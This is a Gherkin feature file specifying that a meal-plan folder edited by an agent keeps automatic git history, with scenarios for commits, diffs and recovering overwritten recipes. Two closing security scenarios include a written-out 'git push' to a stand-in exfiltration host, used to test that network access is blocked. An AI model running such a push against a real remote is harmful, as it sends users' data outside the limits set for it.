@core
Feature: The meal plan remembers what it used to say
  As a busy housewife whose recipes have been collected over years
  I want every change to the folder kept in history
  So that an agent editing a file freehand can never lose Grandma's tortilla trick

  The mounted folder is a git repository. Nothing about that is exposed as a
  concept the housewife has to learn: the server commits after every command
  that changes a file, so history accumulates whether or not the agent thinks to
  ask for it. What the agent gets in return is "git log", "git diff" and a way
  back — the undo button that a folder of files otherwise does not have.

  Background:
    Given a meal-plan folder mounted at "/workspace"

  Scenario: The folder is a repository from the very first mount
    Given the meal-plan folder is brand new
    When I run "git log --oneline"
    Then the command succeeds
    And the output says the folder was initialised

  Scenario: Writing a file commits it
    When I write the file "recipes/chicken-tacos.md":
      """
      ---
      name: Chicken Tacos
      servings: 4
      ---

      ## Ingredients

      - 12 corn tortillas
      """
    And I run "git status --porcelain"
    Then the output is empty

  Scenario: A command that changes files commits what it changed
    Given I have recorded the recipe "Chicken Tacos" serving 4
    When I run "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md"
    And I run "git status --porcelain"
    Then the output is empty
    And the last commit touched the file "recipes/chicken-tacos.md"

  Scenario: A command that changes nothing does not clutter the history
    Given I have recorded the recipe "Chicken Tacos" serving 4
    And the history has 2 commits
    When I run "grep -r tortillas recipes/"
    Then the history has 2 commits

  Scenario: Several files changed by one command land in one commit
    Given I have recorded the recipe "Chicken Tacos" serving 4
    And I have planned dinner on "2026-08-25" with the recipe "Chicken Tacos"
    And the history has 3 commits
    When I run:
      """
      mv recipes/chicken-tacos.md recipes/taco-night.md
      sed -i 's|chicken-tacos|taco-night|; s|Chicken Tacos|Taco Night|' dinners/2026-08-25.md
      sed -i 's|^name: Chicken Tacos$|name: Taco Night|' recipes/taco-night.md
      """
    Then the history has 4 commits
    And the last commit touched the file "recipes/taco-night.md"
    And the last commit touched the file "dinners/2026-08-25.md"

  Scenario: The commit message says what was run
    Given I have recorded the recipe "Chicken Tacos" serving 4
    When I run "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md"
    And I run "git log -1 --format=%s"
    Then the output mentions "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md"

  Scenario: Reading the history of one recipe
    Given the recipe "Chicken Tacos" has been edited on:
      | date       |
      | 2026-07-04 |
      | 2026-08-10 |
    When I run "git log --format=%ad --date=short -- recipes/chicken-tacos.md"
    Then the output is:
      """
      2026-08-10
      2026-07-04
      """

  Scenario: Seeing what an edit actually changed
    Given I have recorded the recipe "Chicken Tacos" serving 4
    When I run "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md"
    And I run "git diff HEAD~1 -- recipes/chicken-tacos.md"
    Then the output contains the line "-servings: 4"
    And the output contains the line "+servings: 6"

  Scenario: Recovering a recipe an agent overwrote
    Given the file "recipes/chicken-tacos.md" contains:
      """
      ---
      name: Chicken Tacos
      servings: 4
      ---

      ## Ingredients

      - 12 corn tortillas

      ## Instructions

      Grandma's trick: warm the tortillas in a dry skillet, never the microwave.
      """
    And I have run:
      """
      cat > recipes/chicken-tacos.md <<'EOF'
      ---
      name: Chicken Tacos
      servings: 4
      ---
      EOF
      """
    When I run "git restore --source=HEAD~1 recipes/chicken-tacos.md"
    Then the command succeeds
    And the file "recipes/chicken-tacos.md" contains the line "Grandma's trick: warm the tortillas in a dry skillet, never the microwave."

  Scenario: Recovering a recipe an agent deleted
    Given I have recorded the recipe "Chicken Tacos" serving 4
    And I have run "rm recipes/chicken-tacos.md"
    When I run "git restore --source=HEAD~1 recipes/chicken-tacos.md"
    Then the command succeeds
    And the recipe "Chicken Tacos" serves 4

  Scenario: Undoing a whole week of planning
    Given I have planned the dinners:
      | date       | recipes       |
      | 2026-08-24 | Chicken Tacos |
      | 2026-08-25 | Chicken Tacos |
    When I run "git revert --no-edit HEAD"
    Then the command succeeds
    And the file "dinners/2026-08-25.md" does not exist in the meal-plan folder

  Scenario: An invalid document is still committed, so it can still be recovered from
    When I write the file "recipes/broken.md":
      """
      no front matter here
      """
    And I run "mealplan validate"
    Then the command fails
    And the file "recipes/broken.md" is committed

  Scenario: History is not a chore the agent has to remember
    When I write the file "recipes/omelette.md":
      """
      ---
      name: Omelette
      servings: 1
      ---

      ## Ingredients

      - 3 eggs
      """
    Then the history has 1 more commit than before
    And I never ran a git command

  @security
  Scenario: History cannot be pushed anywhere
    Given I have recorded the recipe "Chicken Tacos" serving 4
    When I run "git push https://example.com/exfiltrate.git HEAD"
    Then the command fails
    And the error output explains that network access is not allowed

  @security
  Scenario: The repository has no remote to leak to
    When I run "git remote -v"
    Then the output is empty
